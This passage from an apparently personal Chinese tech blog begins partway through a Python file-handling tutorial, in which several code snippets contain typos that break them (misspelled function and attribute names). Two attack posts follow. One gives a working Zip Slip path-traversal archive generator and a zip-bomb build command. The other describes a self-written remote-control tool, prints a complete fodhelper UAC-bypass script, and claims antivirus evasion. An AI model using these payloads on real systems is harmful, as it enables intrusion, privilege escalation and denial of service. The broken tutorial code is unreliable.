<h3 id="4-5创建xml文档"><a href="#4-5创建xml文档" class="headerlink" title="4.5创建xml文档"></a>4.5创建xml文档</h3><p>想创建root Element,然后创建SubElement,最后将root element传入ElementTree(element),创建tree，调用tree.write()方法写入文件</p>
<p>对于创建元素的3个方法: 使用ET.Element、Element对象的makeelement()方法以及ET.SubElement</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subElement</span>(<span class="params">root, tag, text</span>):</span></span><br><span class="line">    ele = ET.SubElement(root, tag)</span><br><span class="line">    ele.text = text</span><br><span class="line">    ele.tail = <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root = ET.Element(<span class="string">&quot;note&quot;</span>)</span><br><span class="line"></span><br><span class="line">to = root.makeelement(<span class="string">&quot;to&quot;</span>, &#123;&#125;)</span><br><span class="line">to.text = <span class="string">&quot;peter&quot;</span></span><br><span class="line">to.tail = <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">root.append(to)</span><br><span class="line"></span><br><span class="line">subElement(root, <span class="string">&quot;from&quot;</span>, <span class="string">&quot;marry&quot;</span>)</span><br><span class="line">subElement(root, <span class="string">&quot;heading&quot;</span>, <span class="string">&quot;Reminder&quot;</span>)</span><br><span class="line">subElement(root, <span class="string">&quot;body&quot;</span>, <span class="string">&quot;Don&#x27;t forget the meeting!&quot;</span>)</span><br><span class="line"></span><br><span class="line">tree = ET.ElementTree(root)</span><br><span class="line">tree.write(<span class="string">&quot;note.xml&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, xml_declaration=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>由于原生保存的XML时默认无缩进，如果想要设置缩进的话， 需要修改保存方式</p>
<p> 代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"><span class="keyword">from</span> xml.dom <span class="keyword">import</span> minidom</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subElement</span>(<span class="params">root, tag, text</span>):</span></span><br><span class="line">    ele = ET.SubElement(root, tag)</span><br><span class="line">    ele.text = text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveXML</span>(<span class="params">root, filename, indent=<span class="string">&quot;\t&quot;</span>, newl=<span class="string">&quot;\n&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span></span>):</span></span><br><span class="line">    rawText = ET.tostring(root)</span><br><span class="line">    dom = minidom.parseString(rawText)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        dom.writexml(f, <span class="string">&quot;&quot;</span>, indent, newl, encoding)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root = ET.Element(<span class="string">&quot;note&quot;</span>)</span><br><span class="line"></span><br><span class="line">to = root.makeelement(<span class="string">&quot;to&quot;</span>, &#123;&#125;)</span><br><span class="line">to.text = <span class="string">&quot;peter&quot;</span></span><br><span class="line">root.append(to)</span><br><span class="line"></span><br><span class="line">subElement(root, <span class="string">&quot;from&quot;</span>, <span class="string">&quot;marry&quot;</span>)</span><br><span class="line">subElement(root, <span class="string">&quot;heading&quot;</span>, <span class="string">&quot;Reminder&quot;</span>)</span><br><span class="line">subElement(root, <span class="string">&quot;body&quot;</span>, <span class="string">&quot;Don&#x27;t forget the meeting!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存xml文件</span></span><br><span class="line">saveXML(root, <span class="string">&quot;note.xml&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="5-Excel格式文件"><a href="#5-Excel格式文件" class="headerlink" title="5.Excel格式文件"></a>5.Excel格式文件</h2><p>python中没有提供处理Excel文件的功能，想要在python中操作Excel需要安装第三方的模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install openpyxl</span><br></pre></td></tr></table></figure>

<h3 id="5-1读Excel"><a href="#5-1读Excel" class="headerlink" title="5.1读Excel"></a>5.1读Excel</h3><h4 id="5-1-1读sheet"><a href="#5-1-1读sheet" class="headerlink" title="5.1.1读sheet"></a>5.1.1读sheet</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> load_wrokbook</span><br><span class="line">wb = load_wrokbook(<span class="string">&#x27;#文件路径&#x27;</span>)</span><br><span class="line"><span class="comment">#sheet相关操作</span></span><br><span class="line"><span class="comment">#1获取所有sheet</span></span><br><span class="line"><span class="built_in">print</span>(wb.sheetnames)<span class="comment">#返回一个列表，获取所有sheet</span></span><br><span class="line"><span class="comment">#2.选中一个sheet，基于sheet名称</span></span><br><span class="line">sheet = wb[<span class="string">&quot;#sheet名称&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(sheet.cell(<span class="number">1</span>,<span class="number">1</span>)<span class="comment">#读取第一行第一列的单元格)</span></span><br><span class="line"><span class="comment">#3.选中一个sheet，基于索引位置</span></span><br><span class="line">sheet = wb.worksheets[<span class="number">0</span>]<span class="comment">#取索引位置为0的sheet</span></span><br><span class="line"><span class="comment">#4.循环所有的sheet</span></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> wb.sheetnames:</span><br><span class="line">      sheet = wb[name]</span><br><span class="line">      </span><br><span class="line"><span class="keyword">for</span> sheet <span class="keyword">in</span> wb,worksheets:</span><br><span class="line">      cell = sheet.cell(<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h4 id="5-1-2读取单元格"><a href="#5-1-2读取单元格" class="headerlink" title="5.1.2读取单元格"></a>5.1.2读取单元格</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> load_wrokbook</span><br><span class="line">wb = load_wrokbook(<span class="string">&#x27;#文件路径&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(wb.sheetnames)</span><br><span class="line">sheet = wb[<span class="string">&quot;#sheet名称&quot;</span>]</span><br><span class="line"><span class="comment">#获取第n行第n列单元格</span></span><br><span class="line">cell = sheet.cell(<span class="number">1</span>,<span class="number">1</span>)<span class="comment">#这里要注意单元格是从1开始的，不是从0开始的。</span></span><br><span class="line">cell.value<span class="comment">#即为单元格中的文本内容</span></span><br><span class="line">cell.style<span class="comment">#样式</span></span><br><span class="line">cell.font<span class="comment">#字体</span></span><br><span class="line">cell.alignment<span class="comment">#排列情况，居中等</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取第n行所有的单元格</span></span><br><span class="line"><span class="keyword">for</span> cell <span class="keyword">in</span> sheet[<span class="number">1</span>]:</span><br><span class="line">    <span class="built_in">print</span>(cell.value)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有行的数据</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> sheet.rows:<span class="comment">#每一行是一个元组,所以第一个索引是0开始。</span></span><br><span class="line">    <span class="built_in">print</span>(row)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取每一列的数据</span></span><br><span class="line"><span class="keyword">for</span> columns <span class="keyword">in</span> sheet.clumnss:</span><br><span class="line">    <span class="built_in">print</span> (clumns.value)</span><br></pre></td></tr></table></figure>

<h3 id="5-2写Excel"><a href="#5-2写Excel" class="headerlink" title="5.2写Excel"></a>5.2写Excel</h3><p>在Excel中想要写文件，大致要分为在：</p>
<h4 id="5-2-1在原Excel文件基础上写内容。"><a href="#5-2-1在原Excel文件基础上写内容。" class="headerlink" title="5.2.1在原Excel文件基础上写内容。"></a>5.2.1在原Excel文件基础上写内容。</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> workbook</span><br><span class="line">wb = load_workbook(<span class="string">&#x27;files/p1.xlsx&#x27;</span>)</span><br><span class="line">sheet = wb.worksheetts(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#找到单元格，并修改单元格内容</span></span><br><span class="line">cell = sheet.cell(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">cell.value = <span class="string">&#x27;新的开始&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将Excel文件保存的到p2.xlsx文件中</span></span><br><span class="line">wb.save(<span class="string">&#x27;files/p2.xlsx&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="5-2-2新创建Excel文件写内容"><a href="#5-2-2新创建Excel文件写内容" class="headerlink" title="5.2.2新创建Excel文件写内容"></a>5.2.2新创建Excel文件写内容</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> workbook</span><br><span class="line"><span class="comment">#创建一个Excel且默认会创建一个sheet（名称为Sheet）</span></span><br><span class="line">wb = workbook.Workbook</span><br><span class="line">sheet = wb.worksheets[<span class="number">0</span>]<span class="comment">#或者sheet = wb[&quot;Sheet&quot;]</span></span><br><span class="line"><span class="comment">#找到单元格，并修改单元格的内容</span></span><br><span class="line">cell = sheet.cell(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">cell.value = <span class="string">&quot;新的开始&quot;</span></span><br><span class="line"><span class="comment">#将Excel文件保存到p2.xlsx</span></span><br><span class="line">wb.sava(<span class="string">&quot;file/p2.xlsx&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="6-压缩文件"><a href="#6-压缩文件" class="headerlink" title="6.压缩文件"></a>6.压缩文件</h2><p>基于python内置的shutil模块可以实现对压缩文件的操作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="comment">#1.压缩文件</span></span><br><span class="line"><span class="comment">#base_name 压缩后的压缩包文件</span></span><br><span class="line"><span class="comment">#format 压缩的格式，例如“zip”，“tar”</span></span><br><span class="line"><span class="comment">#root_dir 要压缩的文件路径</span></span><br><span class="line">shutil.make_archive(base_name=<span class="string">r&#x27;D:\xxx\xxx\xx&#x27;</span>,<span class="built_in">format</span>=<span class="string">&#x27;zip&#x27;</span>,root_dir=<span class="string">r&#x27;D:\xxx\xxx\xx&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#2.解压文件</span></span><br><span class="line"><span class="comment">#filename,要解压的压缩包文件</span></span><br><span class="line"><span class="comment">#extract_dir,解压的路径</span></span><br><span class="line"><span class="comment">#format,压缩文件格式</span></span><br><span class="line">shutil.unpack_archive(filename=<span class="string">r&quot;D:\xxx\xxx\xx&#x27;,extract_dir=r&#x27;D:\xxx\xxx\xx&#x27;,format=&#x27;zip&#x27;)#这里路径前面加上r的目的是为了防止斜杠和字母形成特殊符号。</span></span><br></pre></td></tr></table></figure>

<h2 id="7-路径相关"><a href="#7-路径相关" class="headerlink" title="7.路径相关"></a>7.路径相关</h2><h3 id="7-1查看目录"><a href="#7-1查看目录" class="headerlink" title="7.1查看目录"></a>7.1查看目录</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">abs</span> = os.path.abspath(__file__)<span class="comment">#里面的__file__代指的就是你当前的那个脚本</span></span><br><span class="line"><span class="comment">#获取当前运行的脚本的绝对路径路径</span></span><br><span class="line">path = os.path.dirname(<span class="built_in">abs</span>)<span class="comment">#获取的是当前文件的上一级目录的路径</span></span><br><span class="line">file = os.path.dirname(os.path.abspath(__file__))<span class="comment">#平时写代码的时候就可以这样把他们拼接起来来获取上一级目录的绝对路径，然后再拼接上文件的名字就可以了,也可能是在你的脚本目录下面的目录哦(๑╹◡╹)ﾉ”</span></span><br><span class="line">file_path = file + <span class="string">&#x27;文件名字&#x27;</span> </span><br></pre></td></tr></table></figure>

<h3 id="7-2文件夹"><a href="#7-2文件夹" class="headerlink" title="7.2文件夹"></a>7.2文件夹</h3><h4 id="7-2-1创建文件夹"><a href="#7-2-1创建文件夹" class="headerlink" title="7.2.1创建文件夹"></a>7.2.1创建文件夹</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#os.makedirs(路径)</span></span><br><span class="line"><span class="comment">#案例</span></span><br><span class="line">path = os.path.join(base_path,<span class="string">&#x27;xx&#x27;</span>,<span class="string">&#x27;oo&#x27;</span>,<span class="string">&#x27;uuuu&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):<span class="comment">#如果路径不存在</span></span><br><span class="line">    os.makedirs(path)<span class="comment">#创建一个文件夹</span></span><br></pre></td></tr></table></figure>

<h4 id="7-2-2是否为文件夹"><a href="#7-2-2是否为文件夹" class="headerlink" title="7.2.2是否为文件夹"></a>7.2.2是否为文件夹</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.path.isdir(路径)<span class="comment">#判断是否为文件夹，返回一个布尔值</span></span><br></pre></td></tr></table></figure>

<h4 id="7-2-3删除文件或文件夹"><a href="#7-2-3删除文件或文件夹" class="headerlink" title="7.2.3删除文件或文件夹"></a>7.2.3删除文件或文件夹</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shutil.rmtrree(path)</span><br></pre></td></tr></table></figure>

<h4 id="7-2-4拷贝文件夹"><a href="#7-2-4拷贝文件夹" class="headerlink" title="7.2.4拷贝文件夹"></a>7.2.4拷贝文件夹</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shutil.copytree(<span class="string">&quot;要拷贝的文件夹&quot;</span>,<span class="string">&quot;拷贝到这里&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="7-2-5拷贝文件"><a href="#7-2-5拷贝文件" class="headerlink" title="7.2.5拷贝文件"></a>7.2.5拷贝文件</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shutil.copy(<span class="string">&quot;要拷贝的文件&quot;</span>,<span class="string">&quot;拷贝到这里&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="7-2-6文件或文件夹重命名"><a href="#7-2-6文件或文件夹重命名" class="headerlink" title="7.2.6文件或文件夹重命名"></a>7.2.6文件或文件夹重命名</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shutil.move(<span class="string">&quot;要移动的文件&quot;</span>,<span class="string">&quot;移动到这里&quot;</span>)<span class="comment">#目录要是一样的话就是重命名了(*´▽｀)ノノ</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-python</category>
      </categories>
  </entry>
  <entry>
    <title>关于zip上传点的攻击思路.md</title>
    <url>/2022/03/13/%E5%85%B3%E4%BA%8Ezip%E4%B8%8A%E4%BC%A0%E7%82%B9%E7%9A%84%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-md/</url>
    <content><![CDATA[<h1 id="关于zip上传点的攻击思路"><a href="#关于zip上传点的攻击思路" class="headerlink" title="关于zip上传点的攻击思路"></a>关于zip上传点的攻击思路</h1><h1 id="1-目录走访漏洞（Zip-Slip）"><a href="#1-目录走访漏洞（Zip-Slip）" class="headerlink" title="1.目录走访漏洞（Zip Slip）"></a>1.目录走访漏洞（Zip Slip）</h1><p><a href="https://zhuanlan.zhihu.com/p/90905327">记一次Zip Slip漏洞 - 知乎 (zhihu.com)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="comment"># the name of the zip file to generate</span></span><br><span class="line">zf = zipfile.ZipFile(<span class="string">&#x27;out.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="comment"># the name of the malicious file that will overwrite the origial file (must exist on disk)</span></span><br><span class="line">fname = <span class="string">&#x27;sec_test.txt&#x27;</span></span><br><span class="line"><span class="comment">#destination path of the file</span></span><br><span class="line">zf.write(fname, <span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../tmp/sec_test.tmp&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>Zip Slip是一个广泛存在的漏洞，除了Java语言，JavaScript，Ruby，.NET和Go都有此问题。</p>
<p>就是上传点zip自解压的时候，把我们zip的文件写入的恶意目录给执行了，导致了任意目录文件上传并且覆盖。</p>
<h1 id="2-zip炸弹（不建议使用）"><a href="#2-zip炸弹（不建议使用）" class="headerlink" title="2.zip炸弹（不建议使用）"></a>2.zip炸弹（不建议使用）</h1><p><a href="https://www.cnblogs.com/lnlvinso/p/11838904.html">zip炸弹 - lnlvinso - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/fenwangduanyan/article/details/112969329">(51条消息) 压缩炸弹(zipbomb)制作（附演示）_fenwangduanyan的博客-CSDN博客</a></p>
<h2 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h2><p> 42.zip 是很有名的zip炸弹。一个42KB的文件，解压完其实是个4.5PB的“炸弹”。</p>
<p>​    更有甚者，一个叫做 droste.zip 的大小为 28 KB 的文件，一旦被打开了以后，就会无限解压缩生成一份同样的文件，直到永远。</p>
<p>​    zip炸弹文件中有大量刻意重复的数据，这种重复数据在压缩的时候是可以被丢弃的，这也就是压缩后的文件其实并不大的原因。</p>
<p>​    可以看一下 <a href="https://blog.csdn.net/j2IaYU7Y/article/details/82321082">https://blog.csdn.net/j2IaYU7Y/article/details/82321082</a></p>
<h2 id="制作"><a href="#制作" class="headerlink" title="制作"></a>制作</h2><p>https://<a href="https://so.csdn.net/so/search?q=github&spm=1001.2101.3001.7020">github</a>.com/CreeperKong/zipbomb-generator</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 zipbomb.py --mode=quoted_overlap --num-files=250 --compressed-size=21179 &gt; zbsm.zip</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>–num-files ：压缩包包含的文件数量</p>
<p>–compressed-size：文件压缩大小</p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>关于自写pysocket远控的一些思路</title>
    <url>/2022/12/04/%E5%85%B3%E4%BA%8E%E8%87%AA%E5%86%99pysocket%E8%BF%9C%E6%8E%A7%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h1 id="关于自写pysocket远控的一些思路"><a href="#关于自写pysocket远控的一些思路" class="headerlink" title="关于自写pysocket远控的一些思路"></a>关于自写pysocket远控的一些思路</h1><p>最近自己写了个远控，分享一下。</p>
<p>只是自己练下手，了解下原理，并不建议在实战中使用。</p>
<p>这个远控我只写了几个功能，一对多控制，命令执行，文件上传和下载，屏幕截图，bypassuac。</p>
<h1 id="一对多的实现"><a href="#一对多的实现" class="headerlink" title="一对多的实现"></a>一对多的实现</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;开始监听...&quot;</span>)</span><br><span class="line">server = socket.socket()  <span class="comment"># 定义了一个服务</span></span><br><span class="line">server.bind((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1234</span>))</span><br><span class="line">server.listen(<span class="number">1</span>)</span><br><span class="line">sock, info = server.accept()</span><br><span class="line"><span class="built_in">print</span>(sock)</span><br><span class="line">server.close()</span><br><span class="line">s.append(sock)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取第二个通道</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;开始监听...&quot;</span>)</span><br><span class="line">server = socket.socket()  <span class="comment"># 定义了一个服务</span></span><br><span class="line">server.bind((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1234</span>))</span><br><span class="line">server.listen(<span class="number">1</span>)</span><br><span class="line">sock, info = server.accept()</span><br><span class="line"><span class="built_in">print</span>(sock)</span><br><span class="line">server.close()</span><br><span class="line">s.append(sock)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>

<p>每次和被控机建立了socket连接之后，会返回一个通道，持久化连接，的cnn。通过控制这个通道来进行一对多的实现，也就是代码中的sock。</p>
<h1 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h1><h2 id="粘包问题的解决"><a href="#粘包问题的解决" class="headerlink" title="粘包问题的解决"></a>粘包问题的解决</h2><p>文件传输的时候如果连续发送数据包有时候会遇到粘包的问题，我通过校检文件传输前后md5值是否一致来判断文件是否正确传输。</p>
<p>传输文件前先将文件md5值传输给文件接收端，再文件传输完毕之后，接收端校检md5是否一致。</p>
<p>发送方：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">md5_1 = hashlib.md5()  <span class="comment"># 示例化一个md5对象</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        md5_1.update(line)</span><br><span class="line">file_info[<span class="string">&quot;md5value&quot;</span>]=md5_1.hexdigest() <span class="comment">#将该字符串发送给server,用于验证接收的文件是否完全和发送时一样</span></span><br><span class="line"><span class="built_in">print</span>(md5_1.hexdigest())</span><br><span class="line"></span><br><span class="line">file_info_json=json.dumps(file_info).encode(<span class="string">&quot;utf8&quot;</span>) <span class="comment">#将dict用jason处理后，得到jason格式的字符串，再编码成 bytes字节串</span></span><br><span class="line">ret=struct.pack(<span class="string">&quot;i&quot;</span>,<span class="built_in">len</span>(file_info_json)) <span class="comment">#使用struct模块，将int转变为长度为4的bytes.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 file_info_json的打包长度</span></span><br><span class="line">sock.send(ret)</span><br><span class="line"><span class="comment"># 发送 file_info_json字节串</span></span><br><span class="line">sock.send(file_info_json)</span><br><span class="line"><span class="comment"># 发送 文件数据</span></span><br></pre></td></tr></table></figure>

<p>接收方：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 接收json的打包长度</span></span><br><span class="line">file_info_length_pack=sock.recv(<span class="number">4</span>)</span><br><span class="line">file_info_length=struct.unpack(<span class="string">&quot;i&quot;</span>,file_info_length_pack)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收json字符串</span></span><br><span class="line">file_info_json=sock.recv(file_info_length).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">file_info=json.loads(file_info_json)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 循环接收文件</span></span><br><span class="line">md5=hashlib.md5()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    recv_data_length=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> recv_data_length&lt;filesize:</span><br><span class="line">        data=sock.recv(<span class="number">1024</span>)</span><br><span class="line">        recv_data_length+=<span class="built_in">len</span>(data)</span><br><span class="line">        f.write(data)</span><br><span class="line">        <span class="comment"># MD5摘要</span></span><br><span class="line">        md5.update(data)</span><br><span class="line">        msg=<span class="string">&quot;文件总大小：&#123;&#125;,已成功接收&#123;&#125; 进度:&#123;:.3f&#125;%&quot;</span>.<span class="built_in">format</span>(filesize,recv_data_length,recv_data_length/filesize*<span class="number">100</span>)</span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;接收完成！&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="延迟导致接收端还未开启就开始发送文件"><a href="#延迟导致接收端还未开启就开始发送文件" class="headerlink" title="延迟导致接收端还未开启就开始发送文件"></a>延迟导致接收端还未开启就开始发送文件</h2><p>由于文件传输的时候，需要文件接收方先开启文件接收服务，而在实际远控中，是有一定延迟的，如果接收方还没开始接收服务，发送方就发送了，那么就会产生报错。</p>
<p>以下问题我通过如下来实现</p>
<p><img src="/2022/12/04/%E5%85%B3%E4%BA%8E%E8%87%AA%E5%86%99pysocket%E8%BF%9C%E6%8E%A7%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/image-20221118124951720.png" alt="image-20221118124951720"></p>
<h1 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h1><p>屏幕截图我是通过winapi截图之后保存到被控端，随后被控端将屏幕截图传过来之后，将被控端本地的文件删除</p>
<h1 id="bypassuac"><a href="#bypassuac" class="headerlink" title="bypassuac"></a>bypassuac</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">import</span> winreg <span class="keyword">as</span> winreg</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">import</span> _winreg <span class="keyword">as</span> winreg</span><br><span class="line"></span><br><span class="line">CMD                   = <span class="string">r&quot;C:\Windows\System32\cmd.exe&quot;</span></span><br><span class="line">FOD_HELPER            = <span class="string">r&#x27;C:\Windows\System32\fodhelper.exe&#x27;</span></span><br><span class="line">PYTHON_CMD            = <span class="string">&quot;python&quot;</span></span><br><span class="line">REG_PATH              = <span class="string">&#x27;Software\Classes\ms-settings\shell\open\command&#x27;</span></span><br><span class="line">DELEGATE_EXEC_REG_KEY = <span class="string">&#x27;DelegateExecute&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_admin</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> ctypes.windll.shell32.IsUserAnAdmin()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_reg_key</span>(<span class="params">key, value</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:        </span><br><span class="line">        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)</span><br><span class="line">        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, <span class="number">0</span>, winreg.KEY_WRITE)                </span><br><span class="line">        winreg.SetValueEx(registry_key, key, <span class="number">0</span>, winreg.REG_SZ, value)        </span><br><span class="line">        winreg.CloseKey(registry_key)</span><br><span class="line">    <span class="keyword">except</span> WindowsError:        </span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bypass_uac</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        create_reg_key(DELEGATE_EXEC_REG_KEY, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        create_reg_key(<span class="literal">None</span>, cmd)    </span><br><span class="line">    <span class="keyword">except</span> WindowsError:</span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span>():</span>        </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_admin():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;不是管理员权限&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Trying to bypass the UAC&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:                </span><br><span class="line">            current_dir = __file__</span><br><span class="line">            cmd = <span class="string">&#x27;&#123;&#125; /k &#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(CMD, PYTHON_CMD, current_dir)</span><br><span class="line">            bypass_uac(cmd)                </span><br><span class="line">            os.system(FOD_HELPER)                </span><br><span class="line">            sys.exit(<span class="number">0</span>)                </span><br><span class="line">        <span class="keyword">except</span> WindowsError:</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;本来就是管理员权限&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    execute()</span><br></pre></td></tr></table></figure>

<p>其代码主要就是首先检测当前会话是否是管理员权限，如果是的话就不执行任何操作，如果不是管理员权限就执行bypassuac的操作。</p>
<p>而bypassuac则是通过在注册表中<code>计算机\HKEY_CURRENT_USER\Software\Classes</code>下的ms-settings中添加了如下两个项</p>
<p>持久化可以用白加黑等手段。</p>
<p><img src="/2022/12/04/%E5%85%B3%E4%BA%8E%E8%87%AA%E5%86%99pysocket%E8%BF%9C%E6%8E%A7%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/image-20221121124645560.png" alt="image-20221121124645560"></p>
<h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><p>过火绒，360，bypassuac过不了主防的注册表检测但是不开主防可以过，可以执行一些基本操作，但是要是直接net加用户等操作的话肯定是会告警的，需要配合其他工具。</p>
